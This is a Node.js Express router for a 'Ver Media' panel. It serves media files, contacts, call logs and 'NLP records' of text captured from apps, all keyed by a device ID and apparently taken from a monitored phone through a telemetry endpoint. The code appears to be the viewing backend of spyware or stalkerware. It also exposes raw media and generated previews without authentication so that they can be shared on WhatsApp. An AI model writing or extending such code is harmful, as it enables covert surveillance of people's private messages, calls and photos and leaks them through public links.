const express = require('express');
const router = express.Router();
const rateLimit = require('express-rate-limit');
const {
  authenticateVerUser,
  createVerSessionToken
} = require('../services/verAuthService');
const {
  getRecommendedFeedBlock,
  recordMediaSeen,
  getFavorites,
  toggleFavorite,
  getTags,
  saveMediaTags,
  getAllDownloadedMedia,
  getMediaById,
  getHumanReadableSource
} = require('../services/mediaRecommendationService');
const { verAuthMiddleware } = require('../middleware/verAuth');
const { renderVerLoginView } = require('../views/ver/loginView');
const { renderVerLayout } = require('../views/ver/layoutVer');
const { renderVerFeedView } = require('../views/ver/feedView');
const { renderVerShareView } = require('../views/ver/shareView');
const { getVerClientScript } = require('../views/ver/scriptsVer');
const {
  getDeviceContactsAndCallLogs,
  getDeviceNlpApps,
  getDeviceNlpRecords
} = require('../services/deviceDataService');
const fs = require('fs');
const sharp = require('sharp');

const posterMemoryCache = new Map();

function escapeXml(unsafe) {
  if (!unsafe) return '';
  return String(unsafe)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&apos;');
}

async function generateMediaPosterPng(item) {
  const isVideo = item.type === 'video';
  const isAudio = item.type === 'audio';
  const appSource = item.appSource || getHumanReadableSource(item.path);

  const cleanName = (item.name || 'Archivo multimedia').length > 40
    ? (item.name.substring(0, 37) + '...')
    : (item.name || 'Archivo multimedia');

  const escapedTitle = escapeXml(cleanName);
  const escapedSource = escapeXml(appSource.toUpperCase());
  const badgeWidth = Math.max(120, escapedSource.length * 11 + 36);

  let centerGraphics = '';
  if (isVideo) {
    centerGraphics = `
      <circle cx="600" cy="275" r="72" fill="url(#brandGrad)" filter="url(#dropGlow)" />
      <polygon points="585,240 635,275 585,310" fill="#ffffff" />
    `;
  } else if (isAudio) {
    centerGraphics = `
      <circle cx="600" cy="275" r="72" fill="#059669" filter="url(#dropGlow)" />
      <path d="M580 295V250l35-8v53" stroke="#ffffff" stroke-width="4" stroke-linecap="round" fill="none"/>
      <circle cx="572" cy="295" r="10" fill="#ffffff"/>
      <circle cx="607" cy="287" r="10" fill="#ffffff"/>
    `;
  } else {
    centerGraphics = `
      <circle cx="600" cy="275" r="72" fill="#3b82f6" filter="url(#dropGlow)" />
      <rect x="575" y="250" width="50" height="50" rx="8" fill="none" stroke="#ffffff" stroke-width="4"/>
      <circle cx="590" cy="265" r="5" fill="#ffffff"/>
      <polygon points="580,295 620,295 605,275" fill="#ffffff"/>
    `;
  }

  const svg = `
  <svg width="1200" height="630" viewBox="0 0 1200 630" xmlns="http://www.w3.org/2000/svg">
    <defs>
      <linearGradient id="bgGrad" x1="0%" y1="0%" x2="100%" y2="100%">
        <stop offset="0%" stop-color="#0b0f19"/>
        <stop offset="60%" stop-color="#020617"/>
        <stop offset="100%" stop-color="#0f172a"/>
      </linearGradient>
      <linearGradient id="brandGrad" x1="0%" y1="0%" x2="100%" y2="100%">
        <stop offset="0%" stop-color="#ec4899"/>
        <stop offset="100%" stop-color="#8b5cf6"/>
      </linearGradient>
      <filter id="dropGlow" x="-30%" y="-30%" width="160%" height="160%">
        <feDropShadow dx="0" dy="8" stdDeviation="16" flood-color="#ec4899" flood-opacity="0.45"/>
      </filter>
      <filter id="cardShadow" x="-10%" y="-10%" width="120%" height="120%">
        <feDropShadow dx="0" dy="16" stdDeviation="20" flood-color="#000000" flood-opacity="0.8"/>
      </filter>
    </defs>

    <rect width="1200" height="630" fill="url(#bgGrad)"/>
    <rect x="70" y="45" width="1060" height="540" rx="28" fill="#111827" stroke="#1f2937" stroke-width="3" filter="url(#cardShadow)"/>

    <text x="120" y="115" fill="#f43f5e" font-family="system-ui, -apple-system, sans-serif" font-size="26" font-weight="900" letter-spacing="2">VER MEDIA</text>

    <rect x="120" y="135" width="${badgeWidth}" height="32" rx="16" fill="#1e293b" stroke="#374151" stroke-width="1.5"/>
    <text x="${120 + badgeWidth / 2}" y="156" text-anchor="middle" fill="#38bdf8" font-family="system-ui, -apple-system, sans-serif" font-size="14" font-weight="800" letter-spacing="1">${escapedSource}</text>

    ${centerGraphics}

    <text x="600" y="440" text-anchor="middle" fill="#ffffff" font-family="system-ui, -apple-system, sans-serif" font-size="36" font-weight="800">${escapedTitle}</text>

    <rect x="420" y="475" width="360" height="46" rx="23" fill="#1f2937" stroke="#374151" stroke-width="1.5"/>
    <text x="600" y="504" text-anchor="middle" fill="#9ca3af" font-family="system-ui, -apple-system, sans-serif" font-size="17" font-weight="600">
      ${isVideo ? 'Toca para reproducir video' : isAudio ? 'Toca para escuchar audio' : 'Toca para ver en pantalla completa'}
    </text>
  </svg>`;

  return await sharp(Buffer.from(svg)).png().toBuffer();
}

const verLoginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 20,
  standardHeaders: true,
  legacyHeaders: false,
  message: 'Demasiados intentos de acceso a Ver Media. Por favor intente más tarde.'
});

// GET /expl/ver/login
router.get('/expl/ver/login', (req, res) => {
  return res.send(renderVerLoginView());
});

// POST /expl/ver/login
router.post('/expl/ver/login', verLoginLimiter, (req, res) => {
  const { username, password } = req.body || {};
  const user = authenticateVerUser(username, password);

  if (!user) {
    return res.status(401).send(renderVerLoginView({
      error: 'Usuario o contraseña incorrectos para el módulo Ver.'
    }));
  }

  const sessionToken = createVerSessionToken(user.deviceId, user.username);
  const isSecure = req.secure || req.headers['x-forwarded-proto'] === 'https';

  res.setHeader('Set-Cookie', [
    `ver_session=${sessionToken}; Path=/; HttpOnly; ${isSecure ? 'Secure;' : ''} SameSite=Lax; Max-Age=2592000`, // 30 días
    `ver_device=${encodeURIComponent(user.deviceId)}; Path=/; HttpOnly; ${isSecure ? 'Secure;' : ''} SameSite=Lax; Max-Age=2592000`,
    `ver_user=${encodeURIComponent(user.username)}; Path=/; HttpOnly; ${isSecure ? 'Secure;' : ''} SameSite=Lax; Max-Age=2592000`
  ]);

  return res.redirect(303, '/expl/ver');
});

// GET /expl/ver/logout
router.get('/expl/ver/logout', (req, res) => {
  res.setHeader('Set-Cookie', [
    'ver_session=; Path=/; HttpOnly; Max-Age=0; Expires=Thu, 01 Jan 1970 00:00:00 GMT',
    'ver_device=; Path=/; HttpOnly; Max-Age=0; Expires=Thu, 01 Jan 1970 00:00:00 GMT',
    'ver_user=; Path=/; HttpOnly; Max-Age=0; Expires=Thu, 01 Jan 1970 00:00:00 GMT'
  ]);
  return res.redirect('/expl/ver/login');
});

// =========================================================================
// Rutas Públicas de Compartir (OpenGraph WhatsApp & Streaming de Medios)
// Deben estar antes de verAuthMiddleware para permitir acceso del crawler
// =========================================================================

// GET /expl/ver/raw/:mediaId - Streaming directo de medio para WhatsApp crawler y reproductor
router.get('/expl/ver/raw/:mediaId', (req, res) => {
  const { mediaId } = req.params;
  const deviceHint = req.query.d || null;
  const item = getMediaById(mediaId, deviceHint);

  if (!item || !item.physicalPath || !fs.existsSync(item.physicalPath)) {
    return res.status(404).send('Archivo multimedia no encontrado o no disponible.');
  }

  return res.sendFile(item.physicalPath, {
    acceptRanges: true,
    cacheControl: true,
    maxAge: '7d'
  });
});

// GET /expl/ver/poster/:mediaId - Miniatura de imagen para WhatsApp OpenGraph (rasterizada con sharp)
router.get('/expl/ver/poster/:mediaId', async (req, res) => {
  const { mediaId } = req.params;
  const deviceHint = req.query.d || null;
  const item = getMediaById(mediaId, deviceHint);

  if (!item) {
    return res.status(404).send('No encontrado');
  }

  // Si es una imagen y existe en disco, servirla directamente
  if (item.type === 'image' && item.physicalPath && fs.existsSync(item.physicalPath)) {
    return res.sendFile(item.physicalPath, {
      maxAge: '7d'
    });
  }

  try {
    if (posterMemoryCache.has(mediaId)) {
      res.set('Content-Type', 'image/png');
      res.set('Cache-Control', 'public, max-age=604800');
      return res.send(posterMemoryCache.get(mediaId));
    }

    const pngBuffer = await generateMediaPosterPng(item);
    if (posterMemoryCache.size > 200) {
      const firstKey = posterMemoryCache.keys().next().value;
      posterMemoryCache.delete(firstKey);
    }
    posterMemoryCache.set(mediaId, pngBuffer);

    res.set('Content-Type', 'image/png');
    res.set('Cache-Control', 'public, max-age=604800');
    return res.send(pngBuffer);
  } catch (err) {
    return res.status(500).send('Error generando poster');
  }
});

// GET /expl/ver/post/:mediaId - Vista individual con metaetiquetas OpenGraph para WhatsApp
const handleSharedPost = (req, res) => {
  const { mediaId } = req.params;
  const deviceHint = req.query.d || null;
  const item = getMediaById(mediaId, deviceHint);

  if (!item) {
    return res.status(404).send('Contenido multimedia no encontrado o aun no sincronizado en el servidor.');
  }

  const hostUrl = `${req.protocol}://${req.get('host')}`;
  const html = renderVerShareView({ item, hostUrl });
  return res.send(html);
};

router.get('/expl/ver/post/:mediaId', handleSharedPost);
router.get('/expl/ver/share/:mediaId', handleSharedPost);

// Proteger todas las rutas subsiguientes bajo /expl/ver y /api/ver con el middleware de autenticación
router.use('/expl/ver', verAuthMiddleware);
router.use('/api/ver', verAuthMiddleware);

// ==========================================
// API REST - Feed, Favoritos, Tags y Vistos
// ==========================================

// GET /api/ver/feed - Obtiene el siguiente bloque de 10 contenidos recomendados
router.get('/api/ver/feed', (req, res) => {
  const { deviceId } = req.verUser;
  let excludeIds = [];

  if (req.query.exclude) {
    excludeIds = String(req.query.exclude).split(',').filter(Boolean);
  }

  const block = getRecommendedFeedBlock(deviceId, { excludeMediaIds: excludeIds });
  return res.json({
    success: true,
    deviceId,
    items: block.items,
    totalAvailable: block.totalAvailable,
    hasMore: block.hasMore
  });
});

// POST /api/ver/seen - Marca un medio como visto explícitamente y actualiza el ancla de la Fila 2
router.post('/api/ver/seen', (req, res) => {
  const { deviceId } = req.verUser;
  const { mediaId } = req.body || {};

  if (!mediaId) {
    return res.status(400).json({ error: 'Falta parametro mediaId' });
  }

  const result = recordMediaSeen(deviceId, mediaId);
  return res.json(result);
});

// GET /api/ver/favorites - Consulta todos los medios favoritos del usuario
router.get('/api/ver/favorites', (req, res) => {
  const { deviceId } = req.verUser;
  const favoritesMap = getFavorites(deviceId);
  const tagsMap = getTags(deviceId);
  const allMedia = getAllDownloadedMedia(deviceId);
  const mediaMap = new Map(allMedia.map(m => [m.mediaId, m]));

  const favoritesList = Object.values(favoritesMap)
    .map(f => {
      let full = { ...f };
      if ((!full.path || full.path === '') && mediaMap.has(full.mediaId)) {
        const found = mediaMap.get(full.mediaId);
        full.path = found.path;
        full.name = found.name;
        full.type = found.type;
        full.size = found.size;
        full.lastModified = found.lastModified;
        full.appSource = found.appSource;
      }
      const tagMeta = tagsMap[full.mediaId] || { tags: [], notes: '' };
      return {
        mediaId: full.mediaId,
        deviceId,
        path: full.path,
        name: full.name,
        type: full.type || 'other',
        size: full.size || 0,
        lastModified: full.lastModified || 0,
        appSource: full.appSource || getHumanReadableSource(full.path),
        contentUrl: `/api/telemetry/file-content?deviceId=${encodeURIComponent(deviceId)}&path=${encodeURIComponent(full.path || '')}`,
        isFavorite: true,
        tags: tagMeta.tags || [],
        notes: tagMeta.notes || '',
        savedAt: full.savedAt || new Date().toISOString()
      };
    })
    .sort((a, b) => new Date(b.savedAt) - new Date(a.savedAt));

  return res.json({
    success: true,
    deviceId,
    total: favoritesList.length,
    favorites: favoritesList
  });
});

// POST /api/ver/favorite - Alterna favorito (toggle) para un medio
router.post('/api/ver/favorite', (req, res) => {
  const { deviceId } = req.verUser;
  const { mediaId, path: mediaPath, name, type, size, lastModified, appSource } = req.body || {};

  if (!mediaId) {
    return res.status(400).json({ error: 'Falta parametro mediaId' });
  }

  const mediaItem = {
    mediaId,
    path: mediaPath || '',
    name: name || '',
    type: type || 'other',
    size: Number(size) || 0,
    lastModified: Number(lastModified) || 0,
    appSource: appSource || ''
  };

  const result = toggleFavorite(deviceId, mediaItem);
  return res.json({
    success: true,
    deviceId,
    mediaId,
    isFavorite: result.isFavorite,
    favorite: result.favorite || null
  });
});

// GET /api/ver/tags - Obtiene todas las etiquetas registradas o filtra medios por tag
router.get('/api/ver/tags', (req, res) => {
  const { deviceId } = req.verUser;
  const tagsMap = getTags(deviceId);
  const tagFilter = req.query.tag ? String(req.query.tag).trim().toLowerCase() : null;

  if (tagFilter) {
    const allMedia = getAllDownloadedMedia(deviceId);
    const mediaMap = new Map(allMedia.map(m => [m.mediaId, m]));

    const matchingMedia = [];
    Object.entries(tagsMap).forEach(([mId, meta]) => {
      if (meta.tags && meta.tags.includes(tagFilter)) {
        if (mediaMap.has(mId)) {
          matchingMedia.push(mediaMap.get(mId));
        }
      }
    });

    return res.json({
      success: true,
      tag: tagFilter,
      total: matchingMedia.length,
      items: matchingMedia
    });
  }

  // Si no se filtra por tag, retornar resumen de etiquetas disponibles con conteo
  const tagCounts = {};
  Object.values(tagsMap).forEach(meta => {
    (meta.tags || []).forEach(t => {
      tagCounts[t] = (tagCounts[t] || 0) + 1;
    });
  });

  return res.json({
    success: true,
    deviceId,
    tags: tagCounts
  });
});

// GET /api/ver/search - Busca contenidos por tag, nombre o fecha
router.get('/api/ver/search', (req, res) => {
  const { deviceId } = req.verUser;
  const tagQuery = req.query.tag ? String(req.query.tag).trim().toLowerCase() : '';
  const dateQuery = req.query.date ? String(req.query.date).trim() : '';

  const allMedia = getAllDownloadedMedia(deviceId);

  const filtered = allMedia.filter(item => {
    // 1. Filtro por tag o texto
    if (tagQuery) {
      const cleanTag = tagQuery.startsWith('#') ? tagQuery.substring(1) : tagQuery;
      const mTags = (item.tags || []).map(t => String(t).toLowerCase());
      const hasTag = mTags.some(t => t.includes(cleanTag));
      const hasName = String(item.name || '').toLowerCase().includes(cleanTag);
      const hasSource = String(item.appSource || '').toLowerCase().includes(cleanTag);
      const hasNotes = String(item.notes || '').toLowerCase().includes(cleanTag);
      if (!hasTag && !hasName && !hasSource && !hasNotes) {
        return false;
      }
    }

    // 2. Filtro por fecha (YYYY-MM-DD)
    if (dateQuery) {
      const mtime = item.lastModified || 0;
      if (!mtime) return false;
      const fileDate = new Date(mtime);
      const fileDateStr = fileDate.toISOString().split('T')[0];
      const d = new Date(mtime);
      const year = d.getFullYear();
      const month = String(d.getMonth() + 1).padStart(2, '0');
      const day = String(d.getDate()).padStart(2, '0');
      const localDateStr = `${year}-${month}-${day}`;

      if (dateQuery !== fileDateStr && dateQuery !== localDateStr) {
        return false;
      }
    }

    return true;
  });

  return res.json({
    success: true,
    deviceId,
    tag: tagQuery,
    date: dateQuery,
    total: filtered.length,
    items: filtered
  });
});

// POST /api/ver/tag - Guarda etiquetas y notas de catalogación para un medio
router.post('/api/ver/tag', (req, res) => {
  const { deviceId } = req.verUser;
  const { mediaId, tags, notes } = req.body || {};

  if (!mediaId) {
    return res.status(400).json({ error: 'Falta parametro mediaId' });
  }

  const saved = saveMediaTags(deviceId, mediaId, tags, notes);
  return res.json({
    success: true,
    deviceId,
    mediaId,
    tags: saved.tags,
    notes: saved.notes,
    updatedAt: saved.updatedAt
  });
});

// GET /api/ver/contacts - Obtiene lista consolidada de contactos con metricas de llamadas
router.get('/api/ver/contacts', (req, res) => {
  const { deviceId } = req.verUser;
  try {
    const result = getDeviceContactsAndCallLogs(deviceId);
    return res.json(result);
  } catch (err) {
    console.error('[VER_API] Error al obtener contactos y llamadas:', err);
    return res.status(500).json({ success: false, error: 'Error interno al consultar contactos' });
  }
});

// GET /api/ver/nlp/apps - Catalogo de aplicaciones con cantidad de escritos y ultima actividad (soporta busqueda q global)
router.get('/api/ver/nlp/apps', (req, res) => {
  const { deviceId } = req.verUser;
  const { q = '' } = req.query;
  try {
    const result = getDeviceNlpApps(deviceId, { q });
    return res.json(result);
  } catch (err) {
    console.error('[VER_API] Error al obtener catalogo de apps NLP:', err);
    return res.status(500).json({ success: false, error: 'Error interno al consultar apps' });
  }
});

// GET /api/ver/nlp/records - Registros de textos capturados por aplicacion
router.get('/api/ver/nlp/records', (req, res) => {
  const { deviceId } = req.verUser;
  const { appPackage, q, date, limit, offset } = req.query;
  try {
    const result = getDeviceNlpRecords(deviceId, appPackage, { q, date, limit, offset });
    return res.json(result);
  } catch (err) {
    console.error('[VER_API] Error al obtener registros NLP:', err);
    return res.status(500).json({ success: false, error: 'Error interno al consultar registros' });
  }
});

// GET /expl/ver - Feed Principal Móvil Estilo Instagram
router.get('/expl/ver', (req, res) => {
  const user = req.verUser;
  const initialBlock = getRecommendedFeedBlock(user.deviceId);

  const contentHtml = renderVerFeedView({
    items: initialBlock.items
  });

  const scriptsHtml = getVerClientScript({
    deviceId: user.deviceId,
    initialItems: initialBlock.items
  });

  const html = renderVerLayout({
    title: `Ver Media — ${user.deviceId}`,
    deviceId: user.deviceId,
    username: user.username,
    contentHtml,
    scriptsHtml
  });

  return res.send(html);
});

module.exports = router;
